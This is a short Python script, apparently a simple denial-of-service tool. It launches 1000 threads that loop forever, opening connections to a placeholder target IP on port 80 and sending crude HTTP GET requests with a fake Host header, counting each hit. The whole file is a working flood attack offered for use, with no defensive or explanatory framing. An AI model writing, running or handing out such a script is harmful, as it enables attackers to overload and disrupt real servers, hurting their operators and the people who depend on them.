import threading
import socket

target = "162.000.000.00"
port = 80
fake_ip = '183.21.20.22'

connected_time = 0


def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'),
                 (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()

        global connected_time
        connected_time += 1
        print(connected_time)


for i in range(1000):
    thread = threading.Thread(target=attack)
    thread.start()
